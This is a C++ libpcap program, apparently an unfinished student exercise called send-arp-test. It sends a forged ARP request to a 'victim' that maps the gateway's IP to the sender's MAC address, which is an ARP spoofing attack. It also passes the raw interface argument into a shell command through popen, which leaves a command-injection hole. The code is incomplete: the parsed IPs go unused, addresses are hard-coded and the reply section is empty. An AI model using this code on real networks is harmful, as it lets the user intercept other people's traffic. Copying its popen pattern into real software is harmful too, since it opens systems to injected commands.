#include <cstdio>
#include <pcap.h>
#include <stdlib.h>
#include "header/ethhdr.h"
#include "header/arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

char* getMacAddress(const char* interface) {
    char command[128];
    snprintf(command, sizeof(command), "ip link show %s", interface);
    char* result = (char*)malloc(4096); // 충분히 큰 메모리 할당
    if (!result) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(EXIT_FAILURE);
    }
    result[0] = '\0'; // 문자열 초기화

    FILE* pipe = popen(command, "r");

    if (!pipe) {
        fprintf(stderr, "Failed to run command %s\n", command);
        free(result);
        exit(EXIT_FAILURE);
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        strcat(result, buffer);
    }

    pclose(pipe);

    // MAC 주소 추출
    char* macStart = strstr(result, "link/ether");
    if (macStart) {
        macStart += 11; // "link/ether" 뒤에 MAC 주소가 위치합니다.
        char* macAddress = (char*)malloc(18); // MAC 주소 + NULL 종료 문자를 위한 공간
        if (!macAddress) {
            fprintf(stderr, "Memory allocation failed\n");
            free(result);
            exit(EXIT_FAILURE);
        }
        strncpy(macAddress, macStart, 17);
        macAddress[17] = '\0'; // NULL 종료 문자 추가

        free(result); // 원래의 result 문자열 메모리 해제
        return macAddress; // MAC 주소 문자열 반환
    } else {
        free(result);
        return NULL; // MAC 주소를 찾지 못한 경우
    }
}


int main(int argc, char* argv[]) {
	if (argc % 2  != 0) {
		usage();
		return -1;
	}

	int i = 1;
	while(i < argc - 1){
		char* dev = argv[1];
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// find my mac address
		char* macAddress = getMacAddress(dev);
		printf("%s", macAddress);

		char* sender_ip = argv[i + 1]; // victim
		char* target_ip = argv[i + 2]; // gateway

		EthArpPacket packet;

		//request
		packet.eth_.dmac_ = Mac("f4:6a:dd:8b:3e:77");
		packet.eth_.smac_ = Mac("00:0c:29:bb:e4:89");
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac("00:0c:29:bb:e4:89");
		packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
		packet.arp_.tmac_ = Mac("f4:6a:dd:8b:3e:77");
		packet.arp_.tip_ = htonl(Ip("192.168.43.200"));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);

		// reply

		i += 2;
	}
}
